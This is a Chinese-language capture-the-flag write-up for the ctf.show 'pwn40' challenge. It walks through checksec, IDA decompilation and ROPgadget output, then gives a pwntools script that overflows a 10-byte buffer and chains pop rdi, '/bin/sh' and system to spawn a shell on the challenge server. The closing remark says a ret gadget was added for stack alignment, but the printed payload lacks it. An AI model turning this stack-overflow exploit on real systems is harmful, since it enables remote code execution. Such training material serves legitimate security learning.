```
tasike@tasike-VM:~/Desktop$ chmod 777 pwn40
```

```
tasike@tasike-VM:~/Desktop$ file pwn40
pwn40: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=91102c79e989770362a9ac4876eaedbb75880e88, not stripped
```

```
tasike@tasike-VM:~/Desktop$ checksec pwn40
[*] '/home/tasike/Desktop/pwn40'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

堆栈不可执行

`ida`查看：

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 2, 0LL);
  puts(asc_400828);
  puts(asc_4008A0);
  puts(asc_400920);
  puts(asc_4009B0);
  puts(asc_400A40);
  puts(asc_400AC8);
  puts(asc_400B60);
  puts("    * *************************************                           ");
  puts(aClassifyCtfsho);
  puts("    * Type  : Stack_Overflow                                          ");
  puts("    * Site  : https://ctf.show/                                       ");
  puts("    * Hint  : It has system and '/bin/sh',but they don't work together");
  puts("    * *************************************                           ");
  puts("Just easy ret2text&&64bit");
  ctfshow();
  puts("\nExit");
  return 0;
}
```

`ctfshow`函数：

```c
ssize_t ctfshow()
{
  char buf[10]; // [rsp+6h] [rbp-Ah] BYREF

  return read(0, buf, 0x32uLL);
}
```

`buf`与`rbp`的距离是`0xA`

没有发现后门函数，但是发现`_system`函数：

```c
// attributes: thunk
int system(const char *command)
{
  return system(command);
}
```

`Fn +  Shift + F12`查看字符串：

```
.rodata:0000000000400808	00000008	C	/bin/sh
```

查看`pop_rdi`:

```
tasike@tasike-VM:~/Desktop$ ROPgadget --binary pwn40 --only "pop|ret"
Gadgets information
============================================================
0x00000000004007dc : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004007de : pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004007e0 : pop r14 ; pop r15 ; ret
0x00000000004007e2 : pop r15 ; ret
0x00000000004007db : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004007df : pop rbp ; pop r14 ; pop r15 ; ret
0x00000000004005b8 : pop rbp ; ret
0x00000000004007e3 : pop rdi ; ret
0x00000000004007e1 : pop rsi ; pop r15 ; ret
0x00000000004007dd : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004004fe : ret
0x000000000040069a : ret 0x2019

Unique gadgets found: 12
```

查看`ret`

```
tasike@tasike-VM:~/Desktop$ ROPgadget --binary pwn40 --only "ret"
Gadgets information
============================================================
0x00000000004004fe : ret
0x000000000040069a : ret 0x2019

Unique gadgets found: 2
```



编写`attack40.py`

```python
from pwn import *
context(os = 'Linux', arch = 'amd64', log_level = 'debug')
r = remote('pwn.challenge.ctf.show', 28249)
poprdi = 0x4007e3
ret = 0x4004fe  # 0x40069a
system = 0x400520
binsh = 0x400808
payload = cyclic(0xA + 0x8) + p64(poprdi) + p64(binsh) + p64(system)
r.sendline(payload)
r.interactive()
```

> 本来`payload`是`cyclic(0xA + 0x8) + p64(poprdi) + p64(binsh) + p64(system)`，但是目前是`40字节`，为了堆栈平衡(达到16的倍数)，因此在`system`前面加上`p64(ret)`来平衡堆栈。
